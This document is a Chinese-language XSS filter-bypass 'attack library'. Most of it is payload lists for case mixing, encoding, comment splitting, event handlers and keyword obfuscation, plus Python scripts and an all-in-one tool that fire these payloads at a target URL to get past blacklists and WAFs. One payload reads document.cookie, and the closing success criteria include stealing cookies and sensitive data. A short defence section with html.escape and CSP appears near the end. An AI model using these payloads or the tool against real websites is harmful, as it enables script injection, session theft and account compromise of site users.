# XSS-过滤绕过技术 攻击库

## 漏洞概述

XSS过滤绕过是指在应用程序实施了输入过滤、WAF防护或内容安全策略(CSP)的情况下,通过各种编码、混淆和利用技术成功执行跨站脚本攻击的方法。

**攻击价值**:
- 绕过黑名单过滤
- 突破WAF检测
- 规避CSP策略
- 利用浏览器解析差异
- 在受限环境中执行JavaScript

**常见防护机制**:
- 字符黑名单过滤
- HTML实体编码
- 特殊字符转义
- WAF规则引擎
- Content Security Policy
- X-XSS-Protection头部

## 核心绕过技术

### 1. 大小写混淆绕过

**原理**: 黑名单过滤区分大小写,但浏览器HTML解析不区分

**场景**: 过滤`<script>`标签但未考虑大小写

**漏洞代码**:
```python
# 简单的黑名单过滤
def filter_xss(input_str):
    blacklist = ['<script>', '</script>', 'javascript:', 'onerror']
    for word in blacklist:
        if word in input_str:
            return "Blocked!"
    return input_str
```

**绕过载荷**:

```html
<!-- 基础大小写混淆 -->
<ScRiPt>alert('XSS')</sCrIpT>
<SCRIPT>alert('XSS')</SCRIPT>

<!-- 事件处理器大小写 -->
<img src=x OnErRoR=alert('XSS')>
<body OnLoAd=alert('XSS')>

<!-- JavaScript协议大小写 -->
<a href="JaVaScRiPt:alert('XSS')">Click</a>
```

**Python测试脚本**:

```python
def test_case_bypass(target_url, param='name'):
    """测试大小写绕过"""
    
    payloads = [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<sCrIpT>alert(1)</ScRiPt>',
        '<img src=x OnErRoR=alert(1)>',
        '<body OnLoAd=alert(1)>',
        '<svg OnLoAd=alert(1)>',
    ]
    
    for payload in payloads:
        response = requests.get(target_url, params={param: payload})
        
        # 检查payload是否未被过滤
        if payload.lower() in response.text.lower() and \
           'blocked' not in response.text.lower():
            print(f"[+] 成功! 载荷: {payload}")
            return True
    
    return False
```

### 2. 双重编码绕过

**原理**: 多次编码payload,利用应用程序多次解码的漏洞

**绕过载荷**:

```html
<!-- URL双重编码 -->
%253Cscript%253Ealert('XSS')%253C/script%253E
<!-- 解码一次: %3Cscript%3Ealert('XSS')%3C/script%3E -->
<!-- 解码两次: <script>alert('XSS')</script> -->

<!-- HTML实体双重编码 -->
&lt;script&gt; -> &amp;lt;script&amp;gt;

<!-- Unicode双重编码 -->
\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e
```

**Python脚本**:

```python
import urllib.parse

def double_encode_bypass(payload):
    """双重URL编码"""
    # 第一次编码
    encoded_once = urllib.parse.quote(payload, safe='')
    # 第二次编码
    encoded_twice = urllib.parse.quote(encoded_once, safe='')
    return encoded_twice

# 使用示例
payload = "<script>alert('XSS')</script>"
print(double_encode_bypass(payload))
# 输出: %253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E
```

### 3. 空字符和特殊字符绕过

**原理**: 在关键字中插入空字符、换行符等特殊字符

**绕过载荷**:

```html
<!-- Null字节 -->
<scri\x00pt>alert('XSS')</scri\x00pt>

<!-- 换行符 -->
<scri
pt>alert('XSS')</scri
pt>

<!-- 制表符 -->
<scri	pt>alert('XSS')</scri	pt>

<!-- 回车符 -->
<script>alert('XSS')</script>

<!-- 多种空白字符组合 -->
<img/src=x/onerror=alert('XSS')>
<img	src=x	onerror=alert('XSS')>
```

### 4. 注释符绕过

**原理**: 在标签或代码中插入HTML/JavaScript注释

**绕过载荷**:

```html
<!-- HTML注释 -->
<scr<!--comment-->ipt>alert('XSS')</scr<!---->ipt>

<!-- 在属性中使用注释 -->
<img src=x one<!---->rror=alert('XSS')>

<!-- JavaScript注释绕过 -->
<script>
al/**/ert('XSS')
</script>

<script>
eval(alert)//
('XSS')
</script>
```

### 5. 未闭合标签绕过

**原理**: 利用浏览器自动闭合标签的特性

**场景**: 应用代码如 `<div>$input</div>`

**绕过载荷**:

```html
<!-- 提前闭合外层标签 -->
"></div><script>alert('XSS')</script><div>

<!-- 属性注入 -->
" onload="alert('XSS')

<!-- 多层嵌套闭合 -->
'></div></div><script>alert('XSS')</script>
```

**Python完整利用**:

```python
def test_unclosed_tag_bypass(target_url, injection_point):
    """
    测试未闭合标签绕过
    
    参数:
        target_url: 目标URL
        injection_point: 注入点参数名
    """
    
    payloads = [
        '"></div><script>alert(document.domain)</script>',
        '\' onload=alert(document.domain) x=\'',
        '"><img src=x onerror=alert(document.domain)>',
        '</textarea><script>alert(document.domain)</script>',
        '</title><script>alert(document.domain)</script>',
    ]
    
    for payload in payloads:
        response = requests.get(
            target_url,
            params={injection_point: payload}
        )
        
        # 检查是否成功注入可执行代码
        if '<script>' in response.text or 'onerror=' in response.text:
            print(f"[+] 可能成功! 载荷: {payload[:50]}...")
```

### 6. 事件处理器绕过

**原理**: 使用各种HTML事件处理器代替script标签

**场景**: 过滤`<script>`但未过滤事件处理器

**绕过载荷**:

```html
<!-- 常见事件处理器 -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<svg onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>

<!-- 不常见的事件处理器 -->
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
<video onloadstart=alert('XSS') src=x>
<audio onloadstart=alert('XSS') src=x>

<!-- 鼠标事件 -->
<div onmouseover=alert('XSS')>Hover me</div>
<div onmousedown=alert('XSS')>Click me</div>
<div onmouseup=alert('XSS')>Release</div>
```

**完整事件处理器列表脚本**:

```python
def generate_event_handler_payloads():
    """生成所有事件处理器XSS载荷"""
    
    events = [
        'onload', 'onerror', 'onfocus', 'onblur', 'onclick',
        'ondblclick', 'onmouseover', 'onmouseout', 'onmousedown',
        'onmouseup', 'onkeydown', 'onkeyup', 'onkeypress',
        'onchange', 'onsubmit', 'onreset', 'onselect',
        'onabort', 'oncanplay', 'oncanplaythrough', 'ondurationchange',
        'onemptied', 'onended', 'onloadeddata', 'onloadedmetadata',
        'onloadstart', 'onpause', 'onplay', 'onplaying',
        'onprogress', 'onratechange', 'onseeked', 'onseeking',
        'onstalled', 'onsuspend', 'ontimeupdate', 'onvolumechange',
        'onwaiting', 'ontoggle', 'onwheel', 'oncopy',
        'oncut', 'onpaste', 'onanimationstart', 'onanimationend',
        'onanimationiteration', 'ontransitionend'
    ]
    
    tags = ['img', 'svg', 'body', 'input', 'video', 'audio', 
            'details', 'marquee', 'div', 'iframe']
    
    payloads = []
    for tag in tags:
        for event in events:
            payload = f'<{tag} {event}=alert("XSS")>'
            payloads.append(payload)
    
    return payloads
```

### 7. 编码绕过技术

**A. HTML实体编码**

```html
<!-- 十进制实体 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

<!-- 十六进制实体 -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>

<!-- 混合编码 -->
<img src=x onerror=al&#101;rt('XSS')>
```

**B. JavaScript Unicode编码**

```html
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>

<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>

<!-- 八进制编码 -->
<script>eval('\141\154\145\162\164(1)')</script>

<!-- 十六进制编码 -->
<script>eval('\x61\x6c\x65\x72\x74(1)')</script>
```

**C. Base64编码**

```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

**编码生成脚本**:

```python
import base64

def generate_encoded_payloads(payload):
    """生成多种编码的XSS载荷"""
    
    # HTML十进制实体
    html_decimal = ''.join([f'&#{ord(c)};' for c in payload])
    
    # HTML十六进制实体
    html_hex = ''.join([f'&#x{ord(c):x};' for c in payload])
    
    # JavaScript Unicode
    js_unicode = ''.join([f'\\u{ord(c):04x}' for c in payload])
    
    # JavaScript十六进制
    js_hex = ''.join([f'\\x{ord(c):02x}' for c in payload])
    
    # Base64
    b64 = base64.b64encode(payload.encode()).decode()
    
    return {
        'html_decimal': html_decimal,
        'html_hex': html_hex,
        'js_unicode': js_unicode,
        'js_hex': js_hex,
        'base64': b64
    }

# 使用示例
payload = "alert('XSS')"
encodings = generate_encoded_payloads(payload)

for enc_type, enc_value in encodings.items():
    print(f"{enc_type}:")
    print(f"  {enc_value}\n")
```

### 8. JavaScript替代语法绕过

**原理**: 使用非常规JavaScript语法执行代码

**绕过载荷**:

```html
<!-- 使用反引号 -->
<script>alert`XSS`</script>

<!-- 使用Hex字符串 -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

<!-- 使用构造器 -->
<script>(alert)(1)</script>
<script>[].constructor.constructor('alert(1)')()</script>

<!-- 使用标签模板字符串 -->
<script>alert`1`</script>

<!-- 无括号调用 -->
<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'alert\x281\x29'</script>

<!-- JSFuck风格 -->
<script>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]]</script>
```

### 9. 黑名单关键字绕过

**场景**: 过滤`alert`、`document`、`cookie`等关键字

**绕过载荷**:

```html
<!-- 字符串拼接 -->
<script>eval('ale'+'rt(1)')</script>
<script>window['ale'+'rt'](1)</script>

<!-- 使用编码 -->
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- alert(1) -->

<!-- 使用Unicode转义 -->
<script>\u0061lert(1)</script>
<script>eval('\u0061lert(1)')</script>

<!-- 使用对象属性 -->
<script>window['alert'](1)</script>
<script>this['alert'](1)</script>
<script>self['alert'](1)</script>
<script>top['alert'](1)</script>
<script>parent['alert'](1)</script>

<!-- 使用From.String -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- 获取cookie -->
<script>eval(atob('ZG9jdW1lbnQuY29va2ll'))</script>
```

**关键字绕过生成器**:

```python
def bypass_keyword_filter(keyword):
    """生成绕过关键字过滤的多种方法"""
    
    bypasses = []
    
    # 1. 字符串拼接
    mid = len(keyword) // 2
    bypasses.append(f"'{keyword[:mid]}'+ '{keyword[mid:]}'")
    
    # 2. Unicode转义 (首字母)
    unicode_keyword = f"\\u{ord(keyword[0]):04x}" + keyword[1:]
    bypasses.append(f"eval('{unicode_keyword}')")
    
    # 3. Hex编码
    hex_encoded = ''.join([f'\\x{ord(c):02x}' for c in keyword])
    bypasses.append(f"eval('{hex_encoded}')")
    
    # 4. Base64
    import base64
    b64 = base64.b64encode(keyword.encode()).decode()
    bypasses.append(f"eval(atob('{b64}'))")
    
    # 5. 对象属性访问
    bypasses.append(f"window['{keyword}']")
    
    # 6. String.fromCharCode
    char_codes = ','.join([str(ord(c)) for c in keyword])
    bypasses.append(f"String.fromCharCode({char_codes})")
    
    return bypasses

# 示例: 绕过alert过滤
for bypass in bypass_keyword_filter('alert'):
    print(bypass)
```

### 10. 上下文特定绕过

**A. 在JavaScript字符串中注入**

```html
<script>
var name = "USER_INPUT";
</script>

<!-- 载荷 -->
"; alert('XSS'); //
```

**B. 在HTML属性中注入**

```html
<input value="USER_INPUT">

<!-- 载荷 -->
" onfocus="alert('XSS')" autofocus="
```

**C. 在CSS中注入**

```html
<style>
body { background: USER_INPUT; }
</style>

<!-- 载荷 -->
red; } </style><script>alert('XSS')</script><style>
```

**上下文检测脚本**:

```python
def detect_injection_context(response_text, test_marker='XSSTEST'):
    """检测XSS注入点的上下文"""
    
    import re
    
    contexts = []
    
    # 检测HTML标签属性
    if re.search(rf'<[^>]+{test_marker}[^>]*>', response_text):
        contexts.append('HTML_ATTRIBUTE')
    
    # 检测JavaScript字符串
    if re.search(rf'["\'].*{test_marker}.*["\']', response_text):
        contexts.append('JAVASCRIPT_STRING')
    
    # 检测HTML内容
    if re.search(rf'>[^<]*{test_marker}[^<]*<', response_text):
        contexts.append('HTML_CONTENT')
    
    # 检测JavaScript代码
    if re.search(rf'<script>.*{test_marker}.*</script>', response_text, re.DOTALL):
        contexts.append('JAVASCRIPT_CODE')
    
    return contexts

# 使用示例
response = requests.get(target_url, params={'name': 'XSSTEST'})
contexts = detect_injection_context(response.text)
print(f"检测到的注入上下文: {contexts}")
```

## 高级绕过案例

### 案例1: 严格黑名单绕过

**过滤规则**: 禁止 `<>'"` + 大写字母 + `[]`

**绕过方法**:

```python
# 目标: 执行alert('XSS')

# 方法1: 使用事件处理器 + 反斜杠转义
payload1 = '\\"onmouseover=\\"alert(\\'XSS\\')'

# 方法2: 使用数字和特殊字符构造
payload2 = '\\u0027onload=\\u0027alert(1)'

# 方法3: 在script上下文中使用
payload3 = '\"; eval(atob(\"YWxlcnQoMSk=\")); //'
```

**完整利用脚本**:

```python
import requests
import urllib.parse

def exploit_strict_filter(target_url, param='name'):
    """绕过严格的字符过滤"""
    
    # 测试用例: 只能使用小写字母、数字和部分特殊字符
    payloads = [
        '\\\"onmouseover=\\\"alert(\\'xss\\')',
        '\\\"onerror=\\\"alert(\\'xss\\')',
        '\\\"onfocus=\\\"alert(\\'xss\\')\\\"autofocus=\\\"',
        '\\\\ onfocus=\\\\alert(1)\\\\autofocus=\\\\'
    ]
    
    for payload in payloads:
        encoded = urllib.parse.quote(payload)
        url = f"{target_url}?{param}={encoded}"
        
        response = requests.get(url)
        
        if 'alert' in response.text and 'blocked' not in response.text.lower():
            print(f"[+] 成功绕过! 载荷: {payload}")
            return True
    
    return False
```

### 案例2: WAF绕过技术

**绕过ModSecurity等WAF**:

```html
<!-- 使用混淆和编码 -->
<sCr<script>ipt>alert(1)</sCr</script>ipt>

<!-- 使用注释分割 -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>

<!-- 使用换行符 -->
<scri
pt>alert(1)</scri
pt>

<!-- 组合多种技术 -->
<ScR<!---->iPt
>al<!---->ert(1)</ScR<!---->iPt>
```

**WAF绕过测试脚本**:

```python
def test_waf_bypass(target_url):
    """测试WAF绕过载荷"""
    
    waf_bypass_payloads = [
        '<sCr<script>ipt>alert(1)</sCr</script>ipt>',
        '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
        '<scri\npt>alert(1)</scri\npt>',
        '<img src=x onerr\nor=alert(1)>',
        '<svg/onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee/onstart=alert(1)>',
    ]
    
    for payload in waf_bypass_payloads:
        try:
            response = requests.get(
                target_url,
                params={'q': payload},
                timeout=5
            )
            
            # 检查是否被WAF阻止
            if response.status_code == 403:
                print(f"[-] 被阻止: {payload[:30]}...")
            elif response.status_code == 200:
                print(f"[+] 通过WAF: {payload[:30]}...")
                
                # 检查payload是否在响应中
                if payload in response.text:
                    print(f"[+] 可能成功执行!")
        
        except Exception as e:
            print(f"[!] 错误: {e}")
```

## 综合利用工具

```python
#!/usr/bin/env python3
import requests
from urllib.parse import quote
import base64

class XSSFilterBypass:
    """XSS过滤绕过综合工具"""
    
    def __init__(self, target_url, param='q'):
        self.target_url = target_url
        self.param = param
        self.successful_payloads = []
    
    def test_case_bypass(self):
        """测试大小写绕过"""
        print("[*] 测试大小写绕过...")
        payloads = [
            '<ScRiPt>alert(1)</sCrIpT>',
            '<img src=x OnErRoR=alert(1)>',
        ]
        return self._test_payloads(payloads, "大小写绕过")
    
    def test_event_handlers(self):
        """测试事件处理器"""
        print("[*] 测试事件处理器...")
        events = ['onload', 'onerror', 'onfocus', 'onmouseover']
        payloads = [f'<img src=x {event}=alert(1)>' for event in events]
        return self._test_payloads(payloads, "事件处理器")
    
    def test_encoding(self):
        """测试编码绕过"""
        print("[*] 测试编码绕过...")
        
        # HTML实体编码
        payload1 = '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>'
        
        # JavaScript Unicode
        payload2 = '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>'
        
        # Base64
        b64 = base64.b64encode(b'<script>alert(1)</script>').decode()
        payload3 = f'<iframe src="data:text/html;base64,{b64}">'
        
        payloads = [payload1, payload2, payload3]
        return self._test_payloads(payloads, "编码绕过")
    
    def test_alternative_syntax(self):
        """测试JavaScript替代语法"""
        print("[*] 测试JavaScript替代语法...")
        payloads = [
            '<script>alert`1`</script>',
            '<script>(alert)(1)</script>',
            '<script>eval(\\'alert(1)\\')</script>',
        ]
        return self._test_payloads(payloads, "替代语法")
    
    def _test_payloads(self, payloads, category):
        """测试一组载荷"""
        success_count = 0
        
        for payload in payloads:
            try:
                response = requests.get(
                    self.target_url,
                    params={self.param: payload},
                    timeout=5
                )
                
                # 检查是否成功注入
                if payload in response.text or \
                   'alert' in response.text:
                    print(f"[+] 成功! {category}: {payload[:50]}...")
                    self.successful_payloads.append({
                        'category': category,
                        'payload': payload
                    })
                    success_count += 1
            
            except Exception as e:
                pass
        
        return success_count > 0
    
    def run_all_tests(self):
        """运行所有测试"""
        print(f"\n{'='*60}")
        print(f"XSS过滤绕过测试 - {self.target_url}")
        print(f"{'='*60}\n")
        
        self.test_case_bypass()
        self.test_event_handlers()
        self.test_encoding()
        self.test_alternative_syntax()
        
        print(f"\n{'='*60}")
        print(f"测试完成! 发现 {len(self.successful_payloads)} 个有效载荷")
        print(f"{'='*60}\n")
        
        if self.successful_payloads:
            print("成功的载荷:")
            for item in self.successful_payloads:
                print(f"  [{item['category']}] {item['payload'][:70]}...")

# 使用示例
if __name__ == "__main__":
    tester = XSSFilterBypass("http://target.com/search", param='q')
    tester.run_all_tests()
```

## 防御检测

**有效的XSS防护**:

```python
import html
import re

def safe_xss_filter(user_input):
    """安全的XSS过滤实现"""
    
    # 1. HTML实体编码所有特殊字符
    escaped = html.escape(user_input, quote=True)
    
    # 2. 白名单验证(如果适用)
    # 只允许字母数字和特定字符
    if not re.match(r'^[a-zA-Z0-9\s\-_.]+$', user_input):
        return ""  # 拒绝不符合白名单的输入
    
    # 3. 使用Content Security Policy
    # 在HTTP响应头中设置:
    # Content-Security-Policy: default-src 'self'; script-src 'self'
    
    return escaped
```

## 关键成功要点

1. **了解过滤机制**: 分析应用使用的过滤规则
2. **上下文感知**: 根据注入点上下文选择合适的载荷
3. **编码组合**: 结合多种编码技术
4. **持续测试**: 尝试大量变种载荷
5. **浏览器差异**: 利用不同浏览器的解析差异

## 成功标志

- 绕过黑名单过滤成功注入代码
- 在浏览器中成功执行JavaScript
- 弹出alert对话框显示'XSS'字符串
- 获取cookie或其他敏感信息
- 在受限环境中执行任意代码
